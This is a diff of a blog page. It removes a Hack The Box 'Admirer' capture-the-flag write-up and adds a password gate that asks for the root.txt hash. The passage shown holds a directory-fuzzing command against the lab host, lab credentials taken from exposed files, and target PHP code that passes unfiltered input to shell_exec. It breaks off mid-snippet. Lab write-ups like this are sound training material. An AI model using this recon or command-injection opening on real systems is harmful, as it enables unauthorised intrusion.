@@ -1,807 +1,146 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <title>
-        Hackthebox - Admirer Writeup - A personal cybersecurity blog
-      </title>
-        <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <meta name="viewport"
-      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
-    <meta name="renderer" content="webkit">
-    <meta http-equiv="Cache-Control" content="no-transform" />
-    <meta http-equiv="Cache-Control" content="no-siteapp" />
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <meta name="format-detection" content="telephone=no,email=no,adress=no">
-    
-    <meta name="theme-color" content="#000000" />
-    <meta http-equiv="window-target" content="_top" />
-    
-    
-    <meta name="description" content="topics: fuzzing, linux, python path hijack, adminer exploit, mysql, sudo" />
-    <meta name="generator" content="Hugo 0.71.0 with theme pure" />
-    <title>Hackthebox - Admirer Writeup - A personal cybersecurity blog</title>
-    
-    
-    <link rel="stylesheet" href="/css/style.min.9167e464480f2f7ea5d94b21496c23d7754ad83cf80376bd5fcb8f7988c7a508.css">
-    
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
-    <meta property="og:title" content="Hackthebox - Admirer Writeup" />
-<meta property="og:description" content="topics: fuzzing, linux, python path hijack, adminer exploit, mysql, sudo" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="/writeups/hackthebox-writeups/hackthebox-admirer-writeup/" />
-<meta property="og:image" content="/shortcode" />
-<meta property="og:image" content="/" />
-<meta property="article:published_time" content="2020-05-06T00:00:00+00:00" />
-<meta property="article:modified_time" content="2020-05-06T00:00:00+00:00" />
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <title>Password Protected</title>
 
-<meta itemprop="name" content="Hackthebox - Admirer Writeup">
-<meta itemprop="description" content="topics: fuzzing, linux, python path hijack, adminer exploit, mysql, sudo">
-<meta itemprop="datePublished" content="2020-05-06T00:00:00&#43;00:00" />
-<meta itemprop="dateModified" content="2020-05-06T00:00:00&#43;00:00" />
-<meta itemprop="wordCount" content="1237">
-<meta itemprop="image" content="/shortcode">
-<meta itemprop="image" content="/">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="robots" content="noindex, nofollow">
 
+        <style>
+            *,
+            *:after,
+            *:before {
+                box-sizing: border-box;
+            }
+            body,
+            html {
+                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+                font-weight: 300;
+                font-size: 16px;
+                background: #262626;
+                color: #f2f2f2;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                min-height: 100%;
+            }
 
+            .protected {
+                background: #202020;
+                -webkit-box-shadow: 0 2px 3px 0 rgba(0,0,0,0.1);
+                box-shadow: 0 2px 3px 0 rgba(0,0,0,0.1);
+                border-radius: 3px;
+                min-width: 500px;
 
-<meta itemprop="keywords" content="fuzzing,linux,python path hijack,mysql,adminer,sudo," /><meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="/shortcode"/>
+            }
+            .protected__content {
+                padding: 24px 28px;
+            }
+            .protected__content__heading {
+                font-size: 16px;
+                font-weight: 500;
+                margin: 0 0 12px;
+                line-height: 1;
+            }
+            .protected__alert {
+                display: none;
+                border-bottom: 1px solid transparent;
+                border-radius: 3px 3px 0 0;
+                padding: 12px 14px;
+                color: #a94442;
+                background-color: #f2dede;
+                border-color: #ebccd1;
+            }
+            .protected__content__input {
+                display: block;
+                border: solid 1px #ccc;
+                padding: 12px 14px;
+                -webkit-box-shadow: 0 2px 3px 0 rgba(0,0,0,0.1);
+                box-shadow: 0 2px 3px 0 rgba(0,0,0,0.1);
+                font-size: 16px;
+                width: 100%;
+                border-radius: 3px;
 
-<meta name="twitter:title" content="Hackthebox - Admirer Writeup"/>
-<meta name="twitter:description" content="topics: fuzzing, linux, python path hijack, adminer exploit, mysql, sudo"/>
+                margin-bottom: 12px;
+            }
+            .protected__content__input:focus {
+                outline: none;
+                border-color: #228843;
+            }
+            .protected__content__btn {
+                background-color: #228843;
+                border-radius: 3px;
+                cursor: pointer;
+                border: none;
+                color: #fff;
+                padding: 12px 14px;
+                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+                font-weight: 500;
+                font-size: 16px;
 
-    <!--[if lte IE 9]>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
-      <![endif]-->
+            }
+            .protected__content__btn:hover {
+                background-color: #1C6D36;
+            }
 
-    <!--[if lt IE 9]>
-        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
-        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
-      <![endif]-->
+        </style>
 
-  </head>
+    </head>
 
-  
-  
+    <body>
 
-  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
-    <div class="slimContent">
-      <div class="navbar-header">
-        <div class="profile-block text-center">
-          <a id="avatar" href="/">
-            <img class="img-circle img-rotate" src="/avatar.png" width="200" height="200">
-          </a>
-          <h2 id="name" class="hidden-xs hidden-sm">fmash16</h2>
-          <h3 id="title" class="hidden-xs hidden-sm hidden-md">Student</h3>
-          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Dhaka, Bangladesh</small>
-        </div><div class="search" id="search-form-wrap">
-    <form class="search-form sidebar-form">
-        <div class="input-group">
-            <input type="text" class="search-form-input form-control" placeholder="Search" />
-            <span class="input-group-btn">
-                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
-                        class="icon icon-search"></i></button>
-            </span>
-        </div>
-        <div class="ins-search">
-            <div class="ins-search-mask"></div>
-            <div class="ins-search-container">
-                <div class="ins-input-wrapper">
-                    <input type="text" class="ins-search-input" placeholder="Type something..."
-                        x-webkit-speech />
-                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
-                        aria-label="Close"><span aria-hidden="true">×</span></button>
-                </div>
-                <div class="ins-section-wrapper">
-                    <div class="ins-section-container"></div>
-                </div>
+        <div class="protected">
+            <div class="protected__alert" data-id="alert">You entered the wrong password</div>
+            <div class="protected__content">
+                <h1 class="protected__content__heading">Enter the hash found in the root.txt file to view the writeup</h1>
+                <input class="protected__content__input" data-id="password" type="password" placeholder="password"/>
+                <button data-id="button" type="button" class="protected__content__btn">Continue</button>
             </div>
         </div>
-    </form>
-</div>
 
-        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
-          <span class="sr-only">Toggle navigation</span>
-          <span class="icon-bar"></span>
-          <span class="icon-bar"></span>
-          <span class="icon-bar"></span>
-        </button>
-      </div>
-      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
-        <ul class="nav navbar-nav main-nav">
-            <li class="menu-item menu-item-home">
-                <a href="/">
-                    <i class="icon icon-home-fill"></i>
-                  <span class="menu-title">Home</span>
-                </a>
-            </li>
-            <li class="menu-item menu-item-archives">
-                <a href="/posts/">
-                    <i class="icon icon-archives-fill"></i>
-                  <span class="menu-title">Posts</span>
-                </a>
-            </li>
-            <li class="menu-item menu-item-books">
-                <a href="/categories/">
-                    <i class="icon icon-book-fill"></i>
-                  <span class="menu-title">Writeups</span>
-                </a>
-            </li>
-            <li class="menu-item menu-item-tags">
-                <a href="/tags/">
-                    <i class="icon icon-tags"></i>
-                  <span class="menu-title">Tags</span>
-                </a>
-            </li>
-            <li class="menu-item menu-item-about">
-                <a href="/about/">
-                    <i class="icon icon-cup-fill"></i>
-                  <span class="menu-title">About</span>
-                </a>
-            </li>
-        </ul>
-      </nav>
-    </div>
-  </header>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/js-sha1/0.6.0/sha1.min.js"></script>
+        <script type="text/javascript">
+            "use strict"
+            var button = document.querySelectorAll('[data-id="button"]')
+            var password = document.querySelectorAll('[data-id="password"]')
 
-<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
-  <div class="slimContent">
-    <div class="widget">
-  <h3 class="widget-title"><u> Categories</u></h3>
-    <div class="widget-body">
-        <ul class="category-list">
-            <li class="category-list-item"><a href="/categories/hackthebox-writeups/" class="category-list-link">hackthebox-writeups</a><span class="category-list-count">5</span></li>
-            <li class="category-list-item"><a href="/categories/tryhackme-writeups/" class="category-list-link">tryhackme-writeups</a><span class="category-list-count">3</span></li>
-        </ul>
-    </div>
-</div>
-<div class="widget">
-  <h3 class="widget-title"><u> Tags </u></h3>
-    <div class="widget-body">
-        <ul class="tag-list">
-            
-            
-            <a href="/tags/ad/" class="tag-list-link">ad</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/adminer/" class="tag-list-link">adminer</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/azure/" class="tag-list-link">azure</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/azure-ad-connect/" class="tag-list-link">azure-ad-connect</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/brainfuck/" class="tag-list-link">brainfuck</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/command-injection/" class="tag-list-link">command-injection</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/crackmapexec/" class="tag-list-link">crackmapexec</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/cron/" class="tag-list-link">cron</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/cve-2019-14287/" class="tag-list-link">cve-2019-14287</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/dll-injection/" class="tag-list-link">dll-injection</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/dns/" class="tag-list-link">dns</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/dnsadmins/" class="tag-list-link">dnsadmins</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/docker/" class="tag-list-link">docker</a><span class="tag-list-count">2</span>
-            
-            
-            <a href="/tags/easy/" class="tag-list-link">easy</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/evil-winrm/" class="tag-list-link">evil-winrm</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/file-descriptor/" class="tag-list-link">file-descriptor</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/ftp/" class="tag-list-link">ftp</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/fuzzing/" class="tag-list-link">fuzzing</a><span class="tag-list-count">2</span>
-            
-            
-            <a href="/tags/gtfobins/" class="tag-list-link">gtfobins</a><span class="tag-list-count">2</span>
-            
-            
-            <a href="/tags/hacking/" class="tag-list-link">hacking</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/hydra/" class="tag-list-link">hydra</a><span class="tag-list-count">2</span>
-            
-            
-            <a href="/tags/john/" class="tag-list-link">john</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/kvm/" class="tag-list-link">kvm</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/ldap/" class="tag-list-link">ldap</a><span class="tag-list-count">2</span>
-            
-            
-            <a href="/tags/ldapsearch/" class="tag-list-link">ldapsearch</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/lfi/" class="tag-list-link">lfi</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/linux/" class="tag-list-link">linux</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/mysql/" class="tag-list-link">mysql</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/passthrough/" class="tag-list-link">passthrough</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/php/" class="tag-list-link">php</a><span class="tag-list-count">3</span>
-            
-            
-            <a href="/tags/powershell/" class="tag-list-link">powershell</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/practice/" class="tag-list-link">practice</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/privesc/" class="tag-list-link">privesc</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/pt_chown/" class="tag-list-link">pt_chown</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/pwn/" class="tag-list-link">pwn</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/python/" class="tag-list-link">python</a><span class="tag-list-count">2</span>
-            
-            
-            <a href="/tags/python-path-hijack/" class="tag-list-link">python-path-hijack</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/qemu/" class="tag-list-link">qemu</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/rce/" class="tag-list-link">rce</a><span class="tag-list-count">2</span>
-            
-            
-            <a href="/tags/rpcclient/" class="tag-list-link">rpcclient</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/stego/" class="tag-list-link">stego</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/sudo/" class="tag-list-link">sudo</a><span class="tag-list-count">2</span>
-            
-            
-            <a href="/tags/virtualization/" class="tag-list-link">virtualization</a><span class="tag-list-count">1</span>
-            
-            
-            <a href="/tags/web/" class="tag-list-link">web</a><span class="tag-list-count">1</span>
-            
-        </ul>
+            function login(secret) {
+                var hash = sha1(secret)
+                var url = hash + "/index.html"
+                var alert = document.querySelectorAll('[data-id="alert"]')
 
-    </div>
-</div>
+                var request = new XMLHttpRequest()
+                request.open('GET', url, true)
 
-<div class="widget">
-  <h3 class="widget-title"><u> Recent Posts </u></h3>
-    <div class="widget-body">
-        <ul class="recent-post-list list-unstyled no-thumbnail">
-            <li>
-                <div class="item-inner">
-                    <p class="item-title">
-                        <a href="/writeups/hackthebox-writeups/hackthebox-montevarde-writeup/" class="title">Hackthebox - Montevarde Writeup</a>
-                    </p>
-                    <p class="item-date">
-                        <time datetime="2020-05-30 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-30</time>
-                    </p>
-                </div>
-            </li>
-            <li>
-                <div class="item-inner">
-                    <p class="item-title">
-                        <a href="/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" class="title">Hackthebox - Resolute Writeup</a>
-                    </p>
-                    <p class="item-date">
-                        <time datetime="2020-05-29 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-29</time>
-                    </p>
-                </div>
-            </li>
-            <li>
-                <div class="item-inner">
-                    <p class="item-title">
-                        <a href="/writeups/tryhackme-writeups/tryhackme-year-of-the-rabbit-writeup/" class="title">TryHackMe - Year of the Rabbit - Writeup</a>
-                    </p>
-                    <p class="item-date">
-                        <time datetime="2020-05-21 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-21</time>
-                    </p>
-                </div>
-            </li>
-            <li>
-                <div class="item-inner">
-                    <p class="item-title">
-                        <a href="/writeups/tryhackme-writeups/tryhackme-ultratech-writeup/" class="title">TryHackMe - UltraTech Writeup</a>
-                    </p>
-                    <p class="item-date">
-                        <time datetime="2020-05-16 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-16</time>
-                    </p>
-                </div>
-            </li>
-            <li>
-                <div class="item-inner">
-                    <p class="item-title">
-                        <a href="/writeups/tryhackme-writeups/tryhackme-dogcat-writeup/" class="title">TryHackMe - DogCat Writeup</a>
-                    </p>
-                    <p class="item-date">
-                        <time datetime="2020-05-12 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-12</time>
-                    </p>
-                </div>
-            </li>
-        </ul>
-    </div>
-</div>
+                request.onload = function () {
+                    if (request.status >= 200 && request.status < 400) {
+                        window.location = url
+                    } else {
+                        parent.location.hash = hash
+                        alert[0].style.display = 'block'
+                        password[0].setAttribute('placeholder', 'Incorrect password')
+                        password[0].value = ''
+                    }
+                }
+                request.onerror = function () {
+                    parent.location.hash = hash
+                    alert[0].style.display = 'block'
+                    password[0].setAttribute('placeholder', 'Incorrect password')
+                    password[0].value = ''
+                }
+                request.send()
+            }
 
-  </div>
-</aside>
+            button[0].addEventListener("click", function () {
+                login(password[0].value)
+            })
 
-    
-    
-<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
-  <div class="slimContent">
-    <h4 class="toc-title">Table of Contents</h4>
-    <nav id="toc" class="js-toc toc">
-
-    </nav>
-  </div>
-</aside>
-
-<main class="main" role="main"><div class="content">
-  <article id="-" class="article article-type-" itemscope
-    itemtype="http://schema.org/BlogPosting">
-    
-    <div class="article-header">
-      <h3 itemprop="name">
-  <a
-    class="article-title"
-    href="/writeups/hackthebox-writeups/hackthebox-admirer-writeup/"
-    >Hackthebox - Admirer Writeup</a
-  >
-</h3>
-
-      <div class="article-meta">
-        
-<span class="article-date">
-  <i class="icon icon-calendar-check"></i>&nbsp;
-<a href="/writeups/hackthebox-writeups/hackthebox-admirer-writeup/" class="article-date">
-  <time datetime="2020-05-06 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-06</time>
-</a>
-</span>
-<span class="article-category">
-  <i class="icon icon-folder"></i>&nbsp;
-  <a class="article-category-link" href="/categories/hackthebox-writeups/"> Hackthebox writeups </a>
-</span>  
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>&nbsp;
-    <a class="article-tag-link" href="/tags/fuzzing/"> fuzzing </a>
-    <a class="article-tag-link" href="/tags/linux/"> linux </a>
-    <a class="article-tag-link" href="/tags/python-path-hijack/"> python path hijack </a>
-    <a class="article-tag-link" href="/tags/mysql/"> mysql </a>
-    <a class="article-tag-link" href="/tags/adminer/"> adminer </a>
-    <a class="article-tag-link" href="/tags/sudo/"> sudo </a>
-  </span>
-<br>
-        
-        
-        
-      </div>
-    </div>
-    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
-      <p><img src="/img/htb_admirer/card.png" alt=""></p>
-<h2 id="initial-foothold">Initial Foothold</h2>
-<hr>
-<h3 id="nmap">Nmap</h3>
-<hr>
-<p>Open ports:
-21/tcp open  ftp        vsftpd 3.0.3
-22/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
-80/tcp open  tcpwrapped</p>
-<p><img src="/img/htb_admirer/1.png" alt=""></p>
-<p>Found robots.txt that disallows /admin-dir</p>
-<p><img src="/img/htb_admirer/3.png" alt=""></p>
-<p>Found a possible user named <strong>waldo</strong></p>
-<h3 id="directory-busting">Directory Busting</h3>
-<hr>
-<p>Fuzzing for .txt files in the /admin-dir, found 2 files:</p>
-<ol>
-<li><strong>contacts.txt</strong></li>
-<li><strong>credentials.txt</strong></li>
-</ol>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.187/admin-dir/FUZZ.txt
-</code></pre></div><p><img src="/img/htb_admirer/5.png" alt=""></p>
-<p><img src="/img/htb_admirer/4.png" alt=""></p>
-<p>We find the following in the credentials.txt file.</p>
-<pre><code>[Internal mail account]
-w.cooper@admirer.htb
-fgJr6q#S\W:$P
-
-[FTP account]
-ftpuser
-%n?4Wz}R$tTF7
-
-[Wordpress account]
-admin
-w0rdpr3ss01!
-</code></pre><h3 id="ftp-login">ftp login</h3>
-<hr>
-<p>We login to the ftp server running on port 21 using the creds found</p>
-<p><img src="/img/htb_admirer/6.png" alt=""></p>
-<p>We download the 2 files found in the / directory to our local machine using the
-<code>get &lt;file&gt;</code> command.</p>
-<h4 id="sql-dump-file">sql dump file</h4>
-<ul>
-<li>dumps images and related texts, nothing important</li>
-<li>Running 10.1.41-MariaDB on debian9</li>
-</ul>
-<h4 id="htmltargz">html.tar.gz</h4>
-<p>It seems to be a backup of the original site. We find a new directory
-/utility-scripts and find some interesting php pages there:</p>
-<ul>
-<li>index.php</li>
-<li>admin_tasks.php</li>
-<li>db_admin.php</li>
-</ul>
-<p><img src="/img/htb_admirer/7.png" alt=""></p>
-<h4 id="admin_tasksphp">admin_tasks.php</h4>
-<p>At the url (http://10.10.10.187/utility-scripts/admin_tasks.php), we find:</p>
-<p><img src="/img/htb_admirer/7.png" alt=""></p>
-<p>Here, we can run a some queries about uptime, logged in users, crontab view and
-some intersting backup files of passwd, shadow and so on which are &ldquo;not working&rdquo; as per the file found in the backup as they require root privileges. The php is as follows:</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#776e71">&lt;?php</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#776e71">// Web Interface to the admin_tasks script
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#776e71">//
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#776e71"></span><span style="color:#815ba4">if</span>(<span style="color:#06b6ef">isset</span>(<span style="color:#ef6155">$_REQUEST</span>[<span style="color:#48b685">&#39;task&#39;</span>]))
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>{
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>  <span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">=</span> <span style="color:#ef6155">$_REQUEST</span>[<span style="color:#48b685">&#39;task&#39;</span>];
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>  <span style="color:#815ba4">if</span>(<span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;1&#39;</span> <span style="color:#5bc4bf">||</span> <span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;2&#39;</span> <span style="color:#5bc4bf">||</span> <span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;3&#39;</span> <span style="color:#5bc4bf">||</span> <span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;4&#39;</span> <span style="color:#5bc4bf">||</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>     <span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;5&#39;</span> <span style="color:#5bc4bf">||</span> <span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;6&#39;</span> <span style="color:#5bc4bf">||</span> <span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;7&#39;</span>)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>  {
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>    <span style="color:#776e71">/************************************************************************ *********
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span style="color:#776e71">       Available options:
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span style="color:#776e71">         1) View system uptime
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span style="color:#776e71">         2) View logged in users
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span style="color:#776e71">         3) View crontab (current user only)
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span style="color:#776e71">         4) Backup passwd file (not working)
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span style="color:#776e71">         5) Backup shadow file (not working)
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span style="color:#776e71">         6) Backup web data (not working)
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span style="color:#776e71">         7) Backup database (not working)
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span style="color:#776e71">
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span style="color:#776e71">         NOTE: Options 4-7 are currently NOT working because they need root privileges.
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span style="color:#776e71">               I&#39;m leaving them in the valid tasks in case I figure out a way
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span style="color:#776e71">               to securely run code as root from a PHP page.
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span style="color:#776e71">    ************************************************************************* *********/</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>    <span style="color:#815ba4">echo</span> <span style="color:#06b6ef">str_replace</span>(<span style="color:#48b685">&#34;</span><span style="color:#f99b15">\n</span><span style="color:#48b685">&#34;</span>, <span style="color:#48b685">&#34;&lt;br /&gt;&#34;</span>, <span style="color:#06b6ef">shell_exec</span>(<span style="color:#48b685">&#34;/opt/scripts/admin_tasks.sh
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span style="color:#48b685"></span><span style="color:#f99b15">$task</span><span style="color:#48b685"> 2&gt;&amp;1&#34;</span>));
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>  }
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>  <span style="color:#815ba4">else</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>  {
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>    <span style="color:#815ba4">echo</span>(<span style="color:#48b685">&#34;Invalid task.&#34;</span>);
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>  }
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>}
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span style="color:#776e71">?&gt;</span>
-</code></pre></div><p>We see that the code does not filter our input $task which we can tamper with
-using curl or burpsuite.</p>
-<h4 id="db_adminphp">db_admin.php</h4>
-<p>We find some credentials for the user <strong>waldo</strong> here. Looking at the code, we
-see that what this page does is log in as user waldo to the mysql server, which
-is accesible only from localhost.</p>
-<p>db creds found:
-&gt;  $username = &ldquo;waldo&rdquo;;
-&gt;  $password = &ldquo;Wh3r3_1s_w4ld0?&quot;;</p>
-<h4 id="indexphp">index.php</h4>
-<p>Having a look at the index.php from the ftp, we see that it differs from the
-one running on the site. The backed up one had a php code that tries to login
-to the sql server as the user waldo, but interestingly, with a password
-different from the one found in db_admin.php. Here, the password seems to have
-an error(?), with the mismatched &ldquo;.</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#776e71">&lt;?php</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>   <span style="color:#ef6155">$servername</span> <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;localhost&#34;</span>;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>   <span style="color:#ef6155">$username</span> <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;waldo&#34;</span>;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>   <span style="color:#ef6155">$password</span> <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;]F7jLHw:*G&gt;UPrTo}~A&#34;</span><span style="color:#06b6ef">d6b</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#48b685">   </span><span style="color:#f99b15">$dbname</span><span style="color:#48b685"> = &#34;</span><span style="color:#06b6ef">admirerdb</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span style="color:#48b685">
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#48b685">   // Create connection
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#48b685">   </span><span style="color:#f99b15">$conn</span><span style="color:#48b685"> = new mysqli(</span><span style="color:#f99b15">$servername</span><span style="color:#48b685">, </span><span style="color:#f99b15">$username</span><span style="color:#48b685">, </span><span style="color:#f99b15">$password</span><span style="color:#48b685">, </span><span style="color:#f99b15">$dbname</span><span style="color:#48b685">);
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span style="color:#48b685">   // Check connection
